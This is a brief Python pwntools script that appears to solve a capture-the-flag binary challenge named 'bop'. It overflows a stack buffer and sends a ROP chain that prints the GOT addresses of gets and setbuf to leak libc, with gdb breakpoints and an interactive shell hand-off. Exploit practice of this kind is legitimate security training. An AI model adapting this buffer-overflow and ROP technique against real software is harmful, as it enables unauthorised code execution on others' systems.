from pwn import *
import sys

elf = ELF("bop")

io = process(elf.path)
# io = remote("mc.ax", 30284)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io, '''
    b *0x401365
''')

pop_rdi_ret = 0x4013d3
ret = 0x40101a

io.recvuntil("? ")

p = b'A' * 0x28
p += p64(ret)
p += p64(pop_rdi_ret)
p += p64(elf.got["gets"])
p += p64(elf.sym["printf"])
p += p64(ret)
p += p64(pop_rdi_ret)
p += p64(elf.got["setbuf"])
p += p64(elf.sym["printf"])

io.sendline(p)

r = io.recv(6)
r += b"\x00\x00"

print("gets addr: " + str(hex(u64(r))))

r = io.recv(6)
r += b"\x00\x00"

print("printf addr: " + str(hex(u64(r))))

io.interactive()